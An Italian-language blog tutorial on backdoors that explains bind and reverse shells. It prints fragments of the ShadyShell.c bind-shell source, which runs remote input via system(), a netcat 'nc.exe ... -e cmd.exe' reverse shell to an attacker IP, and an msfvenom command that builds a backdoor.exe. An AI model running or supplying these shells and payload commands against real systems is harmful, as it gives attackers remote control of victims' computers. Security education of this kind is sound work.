---
title: Backdoor - Fondamenti di Sicurezza Informatica
date: 2022-12-04 00:00:00 -500
categories: [Tech]
tags: [tech]
image_path: /assets/
--- 

## Intro

Se vi siete mai interessati di sicurezza informatica, avrete sicuramente un’idea di come le backdoor funzionano e a cosa servono. A prescindere dalla tua preparazione, in questo articolo andrò a dissezionare tutto ciò che ti serve sapere sulle Backdoor.

In particolare vedremo:

1.  Funzionamento Backdoor
2.  Shadyshell.c | codice sorgente di una Backdoor scritta in C
3.  Creazione backdoor con msfvenom + connessione remota da terminale

Alla fine di questa lettura potrai spiegare ai tuoi amici le magie di un codice di queste proporzioni:

```c
if(bind(c,&s,sizeof(s))<0)ve("bind");dup2(c,1);dup2(c,2);s.sin_port=sizeof(u); if(recvfrom(c,&b,1024,0,&u,(int*)&(s.sin_port))<0)ve("socket"); if(connect(c,&u,sizeof(u))<0)ve("socket"); do{for(*v=b,p=0;**v&&((*v-b)<512||(p=*v));(*v)++)if(p||**v=='\r'||**v=='\n') {**v=0;break;}if(p)continue;system(b); recv(c,&b,1024,0);}while(1);exit(0);
```

e se per adesso ti sembra una utopia… non ti preoccupare. Io sono Matteo e ti guiderò in questo articolo conoscendo abbastanza bene le complicanze degli studi informatici-

Farò in modo di intrattenerti e di non dilungarmi in nozioni troppo specifiche, tediose o inutili.

# Funzionamento Backdoor

Una Backdoor è un software installato nel computer di una cybervittima in qualche modo. Finché è attiva, la backdoor fa in modo di inviare informazioni e ricevere **istruzioni** da un host remoto.

Fino a qui niente di spaventoso. Giusto? ﻿  
>Beh… se un Jimmy in Texas che prende il completo controllo del tuo PC non ti spaventa, dovresti riconsiderare un attimo quello che stai per leggere.

La semplicità e versatilità delle backdoor ha fatto in modo che quasi ogni software con nefaste intenzioni contenesse un pezzo di codice dedicato a questo.

Per ora vediamone in dettaglio in funzionamento:

-  Come le backdoor iniziano una connessione tra computer
-  Perché una backdoor rende il tuo PC una marionetta

## Come si crea la connessione tra i computer

Qualcuno di voi si starà chiedendo in che modo i due computer coinvolti nell’atto di scambiarsi dati comunicano.   
Le backdoor per le comunicazioni remote sfruttano il networking, gli indirizzi IP e le porte [0-36000].

Non appena la backdoor è in funzione si ottiene una sessione **shell**. Ogni istruzione, comando o funzione inviata attraverso la backdoor viene eseguita dalla vittima.

Ogni connessione internet che un computer stabilisce avviene grazie a procedure ideate dall’Organizzazione Internazionale della Standardizzazione [ISO]. Questi hanno deciso che ogni pacchetto di rete conterrà:

-   indirizzo IP sorgente
-   indirizzo IP destinatario
-   “Porta” sorgente
-   “Porta” destinatario

La vera e propria connessione si stabilisce solo se il computer della vittima “apre” una porta a noi attaccanti. Questo avviene quando la backdoor installata nel computer della vittima avvia un processo che fa esattamente questo: aprire una porta.

Normalmente un computer tende a rifiutare ogni connessione nefasta e non identificata. Semplicemente blocca ogni connessione che coinvolge una porta chiusa.

Cosa succede però nel momento in cui apriamo una porta in attesa di qualcosa?

Quando un qualsiasi host esterno (hacker) prova a comunicare attraverso quella porta… ecco che si può stabilire una connessione ed il computer vittima ci ascolta, adesso possiamo mandargli tutto ciò che vogliamo.

Adesso che la connessione è stabilita dobbiamo fare in modo che computer vittima **interpreti** quella serie di caratteri e di bit che stiamo comodamente digitando dalla nostra tastiera.

# Perché una backdoor rende il tuo PC una marionetta

Fin ora abbiamo visto come opera una backdoor quando viene eseguita da un computer. Ciò che manca al puzzle è comprendere in che modo i comandi inviati da noi vengono eseguiti dalla vittima.

Infatti questo non avviene in modo standard, deve essere il software backdoor ad inviare le nostre stringhe di caratteri ad un interprete per i comandi. 

Potrei semplicemente dirvi che il malware backdoor ha il compito di mantenere una connessione remota in modo da ricevere e salvare ogni carattere che mandato (dall'hacker) in un buffer o array, per poi eseguirlo con l’interprete di comandi locale. Invece vi mostro un pezzo di codice di una backdoor scritta in C.

```c
  do {
    for ( * v = b, p = 0; ** v && (( * v - b) < 512 || (p = * v));
      ( * v) ++)
      if (p || ** v == '\r' || ** v == '\n')

    {
      ** v = 0;
      break;
    }
    if (p) continue;
    system(b);
    recv(c, & b, 1024, 0);
  } while (1);
  exit(0);
}
```

Spiegazione del ciclo:

>Se non ci sono problemi di overflow con l’input remoto salvato in **b**:

```
esegui system(b);
```

>Aspetta per un altro pacchetto, metti di nuovo l’input remoto in **b** e ripeti.

Spaventoso, vero?

Questa backdoor si chiama ShadyShell.c ed è disponibile nell’archivio di malware di vx-underground.

# Come creare una backdoor con un comando

Se ti dicessi che con un solo comando puoi creare una backdoor per (quasi) ogni sistema vulnerabile?

Immaginiamo di avere come target un server Windows, vogliamo creare un software backdoor per avere una porta di accesso a questo sistema.

Normalmente risolverei un problema del genere scrivendo uno script o dei comandi BASH specifici.

Risoluzione con Bash & netcat:

```
# Target: 172.16.166.130
# Attacker: 192.168.1.116

# On Attacker: set a verbose(v) communication listener(l) on port(p) 4444 
nc -lvp 4444 

# On target: connect to host end execute(e) cmd.exe
nc.exe 192.168.1.116 -e cmd.exe
```

In questo caso però vogliamo creare un software che, quando eseguito, avvia una connessione diretta.

MSFvenom è un CLI-tool (strumento via terminale) che porta con sé un numero impressionante di impostazioni specifiche per la connessione remota tra due host.

In pratica MSFvenom genera un file backdoor con le nostre preferenze di: payload, formato, target…

```
msfvenom -p [payload] LHOST=[our IP] LPORT=[our port] -f exe > backdoor.exe
```

Il comando creerà un file che una volta eseguito dalla vittima connetterà il computer infetto al nostro (o viceversa).   
Vedi: [bind & reverse shell | differenze e usi comuni]

semplice… anche troppo. Immagina cosa puoi fare con un [Cheat Sheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom).